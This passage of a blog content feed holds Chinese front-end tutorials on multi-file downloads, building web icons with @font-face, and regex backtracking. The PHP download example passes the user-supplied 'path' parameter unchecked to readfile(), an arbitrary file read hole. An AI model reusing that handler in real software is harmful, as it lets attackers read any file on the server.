+8aUep1gFLXGeKhqmj+FtGmt9fvvtVvfWMc9w0VsWvUkuI43WUeVtAIcnMYQggYI6Hs6lqwk7pPuNrkPEHwn8N+KNRkvdQh1BpZJY7ho7fVru3haWPbslMUcqpvXYhD7d2VU54FFFNNxd1uPyJIfhb4dt/EkOuxwXy6hBNJPD/xNLryImkz5myHzPLUNkllC4J5IyAaWP4W+GY7+/uzp7yy3sc8UiTXc0kUazHdMIo2cpDvPLeWFyeTRRRd9wH6B8NNB8NyapJZx38kmpxrFePe6pdXbTKAQMmaRjkAkZHOMDOAKmbwLp9n8Pp/CGkr/Zmm/wBnyadbjLS+QjIUB+ZstjPdsn1oopOTfUa91prdf1+hFrfhnWNb0HSLCTVrGOaC6tbi+mXT323CwyrJtiXzv3RZkXljJgZ4PWuooopNtkpWVkf/2Q==&quot;</span> &#125;)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;这里只做到了 chrome 兼容，IE 下懒得去看了，这个需求很少见！</p><h3>四、服务器支持与后端实现</h3><h4>1. 后端实现</h4><p>不使用前端，直接后端实现的原理，就是在响应头中加入一些特殊的标记，如前端发送这样的请求：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">download</span>(<span class="params">path</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ifrm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(frame);</span><br><span class="line">    ifrm.<span class="property">src</span> = <span class="string">&quot;download.php?path=&quot;</span>+path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后端的响应为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">   <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">   <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>告诉浏览器这是一个流文件，作为附件方式发送给你，请忽略 MINE type，直接保存。</p><h4>2. 服务器配置</h4><p>若后台是 apche 作为服务器，可以配置 htaccess 文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;filesmatch <span class="string">&quot;\.(zip|rar)$&quot;</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">Header <span class="built_in">set</span> Content-Disposition attachment</span><br><span class="line">&lt;/filesmatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>意思是只要请求的是 zip 或者 rar 类型的文件，那么就添加一个 <code>Content-Disposition:attachment</code> 的响应头。这样就可以在 php 代码中省略麻烦的操作。</p><h3>五、小结</h3><p>由于行文仓促，文中会有不少错误，对多文件下载有更好的提议，希望提出来共同分享！</p><p>实现多文件下载的方式肯定不止上面提到的几种，而且我这里封装的代码并没有在FF safari opera 中实现，因为他们还没兼容 download 属性，具体情况可以查看 <a href="http://caniuse.com/#feat=download" target="_blank">caniuse</a>&nbsp;。建议在项目中把这样的事情交给后端，几句代码可以搞定。</p><h3>六、参考资料</h3><ul><li><a href="http://www.alloyteam.com/2014/01/use-js-file-download/" target="_blank">在浏览器端用JS创建和下载文件</a> AlloyTeam</li><li><a href="http://thezedienblog.blogspot.com/2013/05/starting-file-download-with-javascript.html" target="_blank">Starting file download with Javascript</a> Ahzaz's Blog</li><li><a href="//developer.mozilla.org/en-US/docs/Web/API/Blob" target="_blank">Blob 流</a> MDN</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 多文件下载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再探@font-face及webIcon制作</title>
      <link href="/blog/2014/01/27/cb-manufacture-font-face-in-web/"/>
      <url>/blog/2014/01/27/cb-manufacture-font-face-in-web/</url>
      
        <content type="html"><![CDATA[<p>@font-face 不能说他是什么新东西了，在 CSS2.0 规范中就有了这玩意儿，IE4.0 开始就已经出现，只是当时用的不是特别广泛，后来在 CSS2.1 草案中又被删掉。随着 web 的急速发展，@font-face 价值越来越凸显，然后再次被纳入 CSS3 草案中。@font-face 是个什么东西，本文不做过多说明，不太清楚的童鞋可以看这里 <a href="http://www.w3schools.com/css/css3_fonts.asp" target="_blank">http://www.w3schools.com/css/css3_fonts.asp</a>。需要强调的是他的书写格式：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">    font-family: <span class="tag">&lt;<span class="name">yourwebfontname</span>&gt;</span>;</span><br><span class="line">    src: <span class="tag">&lt;<span class="name">source</span>&gt;</span> [<span class="tag">&lt;<span class="name">format</span>&gt;</span>][,<span class="tag">&lt;<span class="name">source</span>&gt;</span> [<span class="tag">&lt;<span class="name">format</span>&gt;</span>]]*;</span><br><span class="line">    [font-weight: <span class="tag">&lt;<span class="name">weight</span>&gt;</span>];</span><br><span class="line">    [font-style: <span class="tag">&lt;<span class="name">style</span>&gt;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></style></weight></format></format></yourwebfontname></p><p>举个例子：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: Gentium;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">http://example.com/fonts/Gentium.woff</span>) <span class="built_in">format</span>(<span class="string">&quot;woff&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">font-family</span>: Gentium, serif; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>format 是一个可选参数，他的作用是提示该资源 URI 所引用的字体格式，关于字体格式，可以看下面列表：</p><table><thead><tr><th>format 格式</th><th>Font 格式</th><th>后缀名</th></tr></thead><tbody><tr><td>truetype</td><td>TrueType</td><td>.ttf</td></tr><tr><td>opentype</td><td>OpenType</td><td>.ttf, .oft</td></tr><tr><td>truetype-aat</td><td>TrueType with Apple Advanced Typography extensions</td><td>.ttf</td></tr><tr><td>embedded-opentype</td><td>Embedded OpenType</td><td>.eot</td></tr><tr><td>svg</td><td>SVG Font</td><td>.svg, .svgz</td></tr></tbody></table><p>这堆麻烦的字体格式的出现，是因为各种浏览器对他们的支持程度不一样：</p><table><thead><tr><th>浏览器</th><th>支持类型</th></tr></thead><tbody><tr><td>IE6,7,8</td><td>仅支持 Embedded OpenType(.eot) 格式。</td></tr><tr><td>Firefox 3.5</td><td>支持 TrueType、OpenType(.ttf, .otf) 格式。</td></tr><tr><td>Firefox 3.6</td><td>支持 TrueType、OpenType(.ttf, .otf) 及 WOFF 格式。</td></tr><tr><td>Chrome,Safari,Opera</td><td>支持 TrueType、OpenType(.ttf, .otf) 及 SVG Font(.svg) 格式。</td></tr></tbody></table><p>各浏览器具体的支持情况，可以戳<a href="http://caniuse.com/#feat=fontface" target="_blank">这里</a>。除了可以利用 font-face 引入各种炫酷的字体，还一个比较大的用途是使用它们替换网页图标。下面就说一说 @font-face 在 web 开发中比较有用的 webIcon。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/manufacture-font-face-in-web.html" target="_blank">http://www.cnblogs.com/hustskyking/p/manufacture-font-face-in-web.html</a></p><h3>一、fontCreator 制作 webIcon</h3><p>这部分说的比较啰嗦，算是一个webicon制作教程吧~ 制作的图片取自张鑫旭大哥的<a href="http://www.zhangxinxu.com/wordpress/2013/12/%E9%91%AB%E8%A1%A8%E6%83%85%E5%8C%85/" target="_blank">鑫表情包</a>~</p><p>首先说一说什么是 web icon，可以看看这个页面，<a href="http://fortawesome.github.io/Font-Awesome/" target="_blank">http://fortawesome.github.io/Font-Awesome/</a>，随便瞄准网页上的一个图标，（chrome浏览器）点击右键审查元素，可以看到页面上的图标都没有使用图片，而是用的特殊的字体：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="comment">//html</span></span><br><span class="line">&lt;<span class="selector-tag">i</span> class=<span class="string">&quot;fa fa-flag&quot;</span>&gt;&lt;/i&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//css</span></span><br><span class="line"><span class="selector-class">.fa-flag</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;\f024&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从网页资源列表中可以查看到该网页使用了多种字体：</p><p><img src="https://images.cnitblog.com/blog/387325/201401/270144014223595.jpg" alt=""></p><p>也可以去看看我写的一个 <a href="http://qianduannotes.duapp.com/demo/testFont/index.html" target="_blank">DEMO</a></p><h4>1. 编码与webIcon</h4><p>编码和字体没有关系，但编码和字符是一一对应的，比如 "\u674e" 对应的是 \李"，"\u9756" 对应的是\靖"。而字体在这里有个什么对应关系呢？不同的字体中显示同一个 unicode 编码，看到的效果是不一样的，我们可以让正楷的 "李" 对应 "\u674e"，也可以用行楷对应，当然我们也可以用一张图片来对应。Web Icon 也就是用图片来对应一些 unicode 码。</p><p>但是这里存在一个问题，我们用一张图片来对应 \李" 字，倘若想输入一个正常的\李"字，该怎么去对应呢？ Unicode 包含 0-0x10FFFF 共 1114112 个码位，而汉字占用的码位并不多，只有几千个，在制作 webIcon 时可以选择避开常用的字符集。当然， Unicode 编码也给我们提供了码位的专用区（Pricate Use Area），区间是 E000-F8FF，所以我们可以在这个字符集中放肆 DIY 属于我们自己的字体。</p><h4>2. fontCreator 介绍与字体制作</h4><p>Web Icon 的制作，网上有很多在线工具，不过这些在线工具都是从已有的图片中选择对应关系，约束性比较大，fontCreator 是一款比较优秀的字体制作工具，它能够很智能的将我们导入的图片转换成黑白色的位图，我们可以编辑和修改各个位图区域，按照自己的意愿 DIY。</p><p>打开 fontCreator，新建一个字体：&nbsp;<img src="https://images.cnitblog.com/blog/387325/201401/270144130009357.jpg" alt="" width="924" height="548"></p><p>为了方便演示，我只保留了 A-Z 的字符，其他的全部删除了。</p><p><img src="https://images.cnitblog.com/blog/387325/201401/270144347032127.jpg" alt="" width="222" height="435"></p><p>选中 A ，右击选择导入图片：</p><p><img src="https://images.cnitblog.com/blog/387325/201401/270144495005073.jpg" alt="" width="479" height="403"></p><p>选择 generate，生成字符内容，然后双击 A，进行细节的编辑（放大，平移）：</p><p><img src="https://images.cnitblog.com/blog/387325/201401/270145012668077.jpg" alt="" width="495" height="384"></p><p>依次处理其他几个字母。Ctrl+S 保存为 barret.ttf。P.S：由于导入表情调整大小位置过于繁琐，我只做了 A-I 这几个码位对应的符号，测试的时候使用字母 A-I 测试即可~</p><h4>3. 本地测试</h4><p>为了方便本地测试，我们先安装这个字体：</p><p><img src="https://images.cnitblog.com/blog/387325/201401/270145140786598.jpg" alt=""></p><p>打开记事本，选择字体为 barret，字号调大一点，输入 BCDEF 等字符，看看效果：&nbsp;<img src="https://images.cnitblog.com/blog/387325/201401/270145230473292.jpg" alt=""></p><p>是不是惊呆了，呵呵~</p><p>字体文件下载：<a href="http://files.cnblogs.com/hustskyking/barret.rar" target="_blank">barret.ttf</a></p><h4>4. 网页测试</h4><p>网页测试之前，需要先转化下格式，至于原因在前言部分我已经说了。我们拿到的是 ttf 的字体格式，为了兼容所有的浏览器，必须修改进行格式转换。</p><p>进入<a href="http://www.fontsquirrel.com/tools/webfont-generator" target="_blank">http://www.fontsquirrel.com/tools/webfont-generator</a>，选择字体，点击 Agreement，然后点击下载字体：&nbsp;<img src="https://images.cnitblog.com/blog/387325/201401/270145334695039.jpg" alt="" width="619" height="251"></p><p>转换的拿到的是下面四个文件：</p><p><img src="https://images.cnitblog.com/blog/387325/201401/270145469692715.jpg" alt=""></p><p>用下面一段代码测试下结果：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="keyword">@font-face</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: <span class="string">&#x27;barretregular&#x27;</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.eot&#x27;</span>);</span></span><br><span class="line"><span class="language-css">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.eot?#iefix&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;embedded-opentype&#x27;</span>),</span></span><br><span class="line"><span class="language-css">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.woff&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff&#x27;</span>),</span></span><br><span class="line"><span class="language-css">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>),</span></span><br><span class="line"><span class="language-css">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.svg#barretregular&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;svg&#x27;</span>);</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-weight</span>: normal;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-style</span>: normal;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"><span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-family</span>: <span class="string">&quot;barretregular&quot;</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>:<span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    B​C​D​E​F​G​H​I</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以直接戳这个 <a href="http://qianduannotes.duapp.com/demo/testFont/index.html" target="_blank">DEMO</a></p><p>字体文件下载：<a href="http://files.cnblogs.com/hustskyking/font.rar" target="_blank">barret.ttf and others</a></p><h3>二、@font-face细节</h3><p>根据 CSS3 草案中的描述，'@font-face' 规则允许使用链接到需要时自动激活的字体。这使得用户可以使用在线的字体，而不仅仅拘泥于使用用户端系统内的字体。font-face，拆开来理解，字体的面孔。不管是什么样的面孔，对应的还是同一个码位，而网页设计者需要使用不同的字体来匹配当前的设计。</p><h4>1. local()</h4><p>上面的教程中我给出了两个测试，一个是本地测试，一个是网页测试，本地测试之前需要先安装字体，如果本地已经有 barret 这个字体了，那我们的程序便没有必要在重新去网络上下载这个字体了。这是 CSS 程序应该这样写：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;barretregular&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">local</span>(<span class="string">&quot;barret&quot;</span>),</span><br><span class="line">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret.ttf&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在解析的时候，会先从本地查找是否有 barret 字体，如果没有就忽略 local 语句，如果有的话就直接应用，忽略后面的 url 参数。除了获取本地字体的作用之外，他还有另外一个 hack 用途，看下面这段程序：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;barretregular&#x27;</span>;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.eot&#x27;</span>);</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">local</span>(<span class="string">&quot;☺&quot;</span>),</span><br><span class="line">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.eot?#iefix&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;embedded-opentype&#x27;</span>),</span><br><span class="line">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.woff&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;woff&#x27;</span>),</span><br><span class="line">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.ttf&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;truetype&#x27;</span>),</span><br><span class="line">         <span class="built_in">url</span>(<span class="string">&#x27;./font/barret-webfont.svg#barretregular&#x27;</span>) <span class="built_in">format</span>(<span class="string">&#x27;svg&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中包含 local("☺")，local 中是一个笑脸，很显然，这绝对不是一个字体名字，那他的作用是什么呢？前面我们说了，低版本IE 只支持 eot 文件格式的字体，上面的代码中用到了两个 src，低版本IE会应用第一个 src 的结果，但是，他的解析不会在第一个 src 位置停止，而是继续往后读，看到后面的 src 会发送一个无效的 http 请求。若在 url 前加一个 local 可以阻断这个 http 请求的发送。</p><h4>2. unicode-range</h4><p>他的作用是定义字体支持的 Unicode 字符范围，以 "U+" 或者 "u+" 开头，默认是 "U+0-10FFFF"。</p><p>unicode-range 有三种形式：</p><ol><li>点，e.g. U+416</li><li>分段，e.g. U+400-U+4ff</li><li>通配符，e.g. U+4??(U+400-U+4FF)</li></ol><p>举几个例子：</p><ol><li>大小写字符以及标点符号<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">unicode</span>-range: U+<span class="number">0021</span>-U+<span class="number">007</span>B;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>大小写字符和数字<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">unicode</span>-range:</span><br><span class="line">    <span class="attribute">U</span>+<span class="number">0030</span>-U+<span class="number">0039</span>, / <span class="number">0</span>-<span class="number">9</span> *</span><br><span class="line">    <span class="attribute">U</span>+<span class="number">0041</span>-U+<span class="number">005</span>A, / Uppercase A-Z /</span><br><span class="line">    <span class="attribute">U</span>+<span class="number">0061</span>-U+<span class="number">007</span>A; / Lowercase a-z /</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>小写字母，大写字母 T，和 "." 号<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">unicode</span>-range:</span><br><span class="line">    <span class="attribute">U</span>+<span class="number">0054</span>-U+<span class="number">0054</span>, / T /</span><br><span class="line">    <span class="attribute">U</span>+<span class="number">0061</span>-U+<span class="number">007</span>A, / a-z /</span><br><span class="line">    <span class="attribute">U</span>+<span class="number">002</span>E-U+<span class="number">002</span>E; / . (period) */</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>这玩意儿有啥用途呢？</p><blockquote><p><code>@font-face</code> 有相关属性 <code>unicode-range</code>，可用类似这样的一段 CSS 来指定以中文字体显示弯引号（这是 CSS3 特性，支持还不广泛，但对于这种非关键样式来说够用了）：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Chinese Quotes&quot;</span>;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">local</span>(<span class="string">&quot;Some Chinese Font&quot;</span>);</span><br><span class="line">    unicode-range: U+<span class="number">2018</span>-<span class="number">2019</span>, U+<span class="number">201</span>C-<span class="number">201</span>D;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Chinese Quotes&quot;</span>, <span class="string">&quot;Some Latin Font&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;Some Chinese Font&quot;</span>, generic-family;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同理，这一招也可以用于破折号、间隔号等和西文标点共享码位的中文标点。</p></blockquote><p>可以戳知乎上的<a href="http://www.zhihu.com/question/20597706" target="_blank">这一贴</a>。</p><h3>三、优缺点</h3><p>优点有一大堆，图标的颜色可以随意修改，大小也是可以随便控制的，不需要折腾图片与文字的对齐问题，因为他本身就是文字，还可以使用阴影、文字渐变等 CSS3 的效果，总之就像操作一般字体一样处理他们，该有的特点都有。</p><p>缺点也是十分明显的，慢速网络以及翻墙代理下情况特别糟糕。外国很多网站的页面都使用了网络字体，而网络字体下载是需要时间的，有些字体可能还比较大，在下载完毕之前，页面有文字的地方都没有渲染出来，体验不好的情况需要等待三五秒中。不过这种情况还是可以优化的，先用一般字体顶替样式，等下载完毕了再利用 JS 来重新渲染，不过这个代码比较高，而且也不好判断何时下载完成了。</p><h3>四、小结</h3><p>本文的目的是展示 web icon 的从无到有的一个过程，一些网站提供了很多不错的 webIcon 字库，如果有需求可以直接去网站上下载，自己制作的话成本太高。</p><h3>五、参考资料</h3><ul><li><a href="http://www.w3.org/TR/css3-fonts/#the-font-face-rule" target="_blank">http://www.w3.org/TR/css3-fonts/#the-font-face-rule</a> W3.ORG</li><li><a href="http://www.php100.com/manual/css3_0/@font-face.shtml" target="_blank">http://www.php100.com/manual/css3_0/@font-face.shtml</a> Font-Face</li><li><a href="http://www.fontsquirrel.com/fontface/generator" target="_blank">http://www.fontsquirrel.com/fontface/generator</a> Tool</li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> webicon </tag>
            
            <tag> font-face </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进阶正则表达式</title>
      <link href="/blog/2014/01/18/cb-how-regular-expressions-work/"/>
      <url>/blog/2014/01/18/cb-how-regular-expressions-work/</url>
      
        <content type="html"><![CDATA[<p>关于正则表达式，网上可以搜到一大片文章，我之前也搜集了一些资料，并做了排版整理，可以看这篇文章<a href="http://www.cnblogs.com/hustskyking/archive/2013/06/04/RegExp.html" target="_blank">http://www.cnblogs.com/hustskyking/archive/2013/06/04/RegExp.html</a>，作为基础入门讲解，这篇文章说的十分到位。</p><p>记得最开始学习正则，是使用 php 做一个爬虫程序。为了获取指定的信息，必须用一定的方式把有规律的数据匹配出来，而正则是首选。下面是当时写的爬虫程序的一个代码片段：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$regdata</span> = <span class="string">&quot;/&lt;font size=&quot;</span>\&quot;3\&quot;<span class="string">&quot;&gt;((?&lt;bf&gt;[^&lt;]*)&lt;br \=&quot;</span><span class="string">&quot;&gt;)&#123;0,1&#125;⊙(?&lt;bs&gt;.&#123;12&#125;)\S*\s/&quot;</span>;</span><br><span class="line"></span><br><span class="line">//获取页面</span><br><span class="line"><span class="variable">$html</span> = file_get_contents(<span class="string">&#x27;http://www.qnwz.cn/html/daodu/201107/282277.html&#x27;</span>);</span><br><span class="line"><span class="variable">$html</span> = iconv(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$html</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$html</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    die(<span class="string">&quot;&lt;hr&gt;出错：【错】无法打开《青年文摘》页面&lt;hr&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//匹配页面信息</span><br><span class="line">preg_match_all(<span class="variable">$regdata</span>, <span class="variable">$html</span>, <span class="variable">$mdata</span>);</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$mdata</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当时写代码还真是欢乐多，什么都不懂，什么都是新知识，学起来津津有味。我觉得学习知识一定要把握最基本的原理，先把一个知识的大概轮廓搞清楚，然后学习怎么去使用他，完了就是深入学习，了解底层基础实现。很多人解决问题都是靠经验，这个当然很重要，但如果我们弄懂了一项技术最底层的实现，完全可以靠自己的推断分析出问题的根源。我对一些公司的招聘要求特别不满，说什么要三年五年Javascript编程经验云云，经验当然和时间成正相关，但是对于那些没有三年五年工作经验却照样能够解决实际的人呢？算是小小的吐槽吧，下面进入正题。</p><h3>一、正则表达式的工作机制</h3><p>画了一个草图，简单的说明了下正则表达式的工作原理。</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">    +--------+</span></span><br><span class="line"><span class="code">    |  编译  |</span></span><br><span class="line"><span class="code">    +--------+</span></span><br><span class="line"><span class="code">         |</span></span><br><span class="line"><span class="section">         ↓</span></span><br><span class="line"><span class="section">+----------------+</span></span><br><span class="line">|  设置开始位置    |←---------+</span><br><span class="line"><span class="code">+----------------+</span>          ↑</span><br><span class="line"><span class="code">         |                  |</span></span><br><span class="line"><span class="code">         ↓               其 |</span></span><br><span class="line"><span class="code">+----------------+</span>       他 |</span><br><span class="line">|  匹配 &lt; 回溯    |       路 |</span><br><span class="line"><span class="code">+----------------+</span>       径 |</span><br><span class="line"><span class="code">         |                  |</span></span><br><span class="line"><span class="code">         ↓                  |</span></span><br><span class="line"><span class="code">+----------------+</span>          |</span><br><span class="line"><span class="section">|  成功 or 失败   |---------→+</span></span><br><span class="line"><span class="section">+----------------+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你写的任何一个正则直接量或者 RegExp 都会被浏览器编译为一个原生代码程序，第一次匹配是从头个字符开始，匹配成功时，他会查看是否还有其他的路径没有匹配到，如果有的话，回退到上一次成功匹配的位置，然后重复第二步操作，不过此时开始匹配的位置（lastIndex）是上次成功位置加 1.</p><p>如果要深入了解正则表达式的内部原理，必须先理解匹配过程的一个基础环节&mdash;&mdash;回溯，他是驱动正则的一个基本动力，也是性能消耗、计算消耗的根源。</p><h3>二、回溯</h3><p>正则表达式中出现最多的是分支和量词，上面的 demo 中可以很清楚的看到 hi 和 hello 这两个分支，当匹配到第一个字符 h 之后，进入 (i|ello) 的分支选择，首先是进入 i 分支，当 i 分支匹配完了之后，再回到分支选择的位置，重新选择分支。简单点说，分支就是 <code>|</code> 操作符带来的多项选择问题，而量词指的是诸如 <code>*, +?, &#123;m,n&#125;</code> 之类的符号，正则表达式必须决定何时尝试匹配更多的字符。下面结合回溯详细说说分支和量词。</p><h4>1. 分支</h4><p>继续分析上面那个案例。<code>"Lalala. Hi, barret. Hello, John".match(/H(i|ello), barret/g)</code>,首先会查找 H 字符，在第九位找到 H 之后，正则子表达式提供了两个选择 (i|ello)，程序会先拿到最左边的那个分支，进入分支后，在第十位匹配到了 i，接着匹配下一个字符，下一个字符是逗号，接着刚才的位置又匹配到了这个逗号，然后再匹配下一个，依次类推，直到完整匹配到整个正则的内容，此时程序会在<code>Hi, barret</code>后面做一个标记，表示在这里进行了一次成功的匹配。但程序到此并没有结束，因为后面加了一个全局参数，依然使用这个分支往后匹配，很显然，到了 Hello 的时候，Hi 分支匹配不了了，于是程序会回溯到刚才我们做标记的位置，并进入第二个分支，从做标记的位置重新开始匹配，依次循环。</p><p>只要正则表达式没有尝试完所有的可选项，他就会回溯到最近的决策点（也就是上次匹配成功的位置）。</p><h4>2. 量词</h4><p>量词这个概念特别简单，只是在匹配过程中有贪婪匹配和懒惰匹配两种模式，结合回溯的概念理解稍微复杂。还是用几个例子来说明。</p><p><strong>1) 贪婪</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">str = <span class="string">&quot;AB1111BA111BA&quot;</span>;</span><br><span class="line">reg = <span class="regexp">/AB[\s\S]+BA/</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(str.match(reg));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先是匹配AB，遇到了 <code>[\s\S]+</code>，这是贪婪模式的匹配，他会一口吞掉后面所有的字符，也就是如果 reg 的内容为 AB[\s\S]+，那后面的就不用看了，直接全部匹配，而往后看，正则后面还有B字符，所以他会先回溯到倒数第一个字符，匹配看是否为 B，显然倒数第一个字符不是B，于是他又接着回溯，找到了B字母，找到之后就不继续回溯了，而是往后继续匹配，此刻匹配的是字符A，程序发现紧跟B后的字母确实是A，那此时匹配就结束了。如果没有看明白，可以再读读下面这个图：</p><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">  REG: /AB[\s\S]+BA/</span><br><span class="line">MATCH: <span class="keyword">A</span>               匹配第一个字符</span><br><span class="line">       AB              匹配第二个字符</span><br><span class="line">       AB1111BA111BA   [\s\S]+ 贪婪吞并所有字符</span><br><span class="line">       AB1111BA111BA   回溯，匹配字符B</span><br><span class="line">       AB1111BA111B    找到字符B，继续匹配<span class="keyword">A</span></span><br><span class="line">       AB1111BA111BA   找到字符<span class="keyword">A</span>，匹配完成，停止匹配</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2) 懒惰（非贪婪）</strong></p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">str = <span class="string">&quot;AB1111BA111BA&quot;</span>;</span><br><span class="line">reg = <span class="regexp">/AB[\s\S]+?BA/</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(str.match(reg));</span><br><span 